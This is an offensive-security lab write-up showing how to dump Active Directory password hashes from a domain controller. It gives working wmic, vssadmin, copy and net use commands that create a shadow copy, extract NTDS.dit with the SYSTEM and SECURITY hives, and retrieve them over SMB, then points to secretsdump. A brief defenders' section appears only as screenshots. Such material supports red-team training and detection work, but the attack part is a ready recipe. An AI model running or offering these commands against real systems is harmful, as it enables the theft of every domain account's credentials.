# Dumping Domain Controller Hashes via wmic and Vssadmin Shadow Copy

## Dumping Domain Controller Hashes via wmic and Vssadmin Shadow Copy

This quick labs hows how to dump all user hashes from the DC by creating a shadow copy of the C drive using vssadmin - remotely.

This lab assumes the attacker has already gained administratrative access to the domain controller.

### Execution

Create a shadow copy of the C drive of the Domain Controller:

{% code title="attacker\@victim" %}
```csharp
wmic /node:dc01 /user:administrator@offense /password:123456 process call create "cmd /c vssadmin create shadow /for=C: 2>&1"
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LfaOgfkP7GFkJlTb7pd%2F-LfaP9JMv1K3AOzIQNBc%2FAnnotation%202019-05-23%20213609.png?alt=media\&token=a7cce976-ef28-4688-b7a3-f103d69590f8)

Copy the NTDS.dit, SYSTEM and SECURITY hives to C:\temp on the DC01:

{% code title="attacker\@victim" %}
```csharp
wmic /node:dc01 /user:administrator@offense /password:123456 process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\temp\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM c:\temp\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY c:\temp\"
```
{% endcode %}

Below shows the above command executed on the attacking machine (right) and the files being dumped to c:\temp on the DC01 on the left:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LfaOgfkP7GFkJlTb7pd%2F-Lfa_NvNdi0W11EARqKP%2Fdc-dump.gif?alt=media\&token=46a506bf-5537-40cd-8da4-6c0cde164ea4)

Mount the DC01\c$\temp locally in order to retrieve the dumped files:

{% code title="attacker\@victim" %}
```csharp
net use j: \\dc01\c$\temp /user:administrator 123456; dir j:\
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LfaOgfkP7GFkJlTb7pd%2F-Lfa_lAev0lVzTL40dh-%2FAnnotation%202019-05-23%20222654.png?alt=media\&token=f1ab644d-860e-41ec-9cac-2b97ddf7ff64)

Now, of you go extracting hashes with secretsdump as shown here:

### Observations

A quick note for defenders on the proces ancestry:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LfaOgfkP7GFkJlTb7pd%2F-LfaPCUFMkVICWg5F4zc%2FAnnotation%202019-05-23%20213352.png?alt=media\&token=8b7f0b40-146e-40f9-a36c-c733479fc422)

and of course commandlines:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LfaOgfkP7GFkJlTb7pd%2F-LfabW8Rhdez1VI3WLZt%2FAnnotation%202019-05-23%20223432.png?alt=media\&token=0dc6d780-1e07-45df-ab8d-5402ace16bcf)

as well as service states:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LfaOgfkP7GFkJlTb7pd%2F-Lfaavm-6B3pUsOpbfYF%2FAnnotation%202019-05-23%20223157.png?alt=media\&token=70dad31a-575c-4c7b-bba9-af9a9502e97e)

...and of course the lateral movement piece:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-Lfag3Gd9KcvfWjULUkS%2F-LfahZYptQD0OS_inswZ%2FAnnotation%202019-05-23%20230027.png?alt=media\&token=2559f468-573b-4676-a663-3fe4b72ae90e)

### References

[https://twitter.com/netmux/status/1123936748000690178?s=12](https://twitter.com/netmux/status/1123936748000690178?s=12)
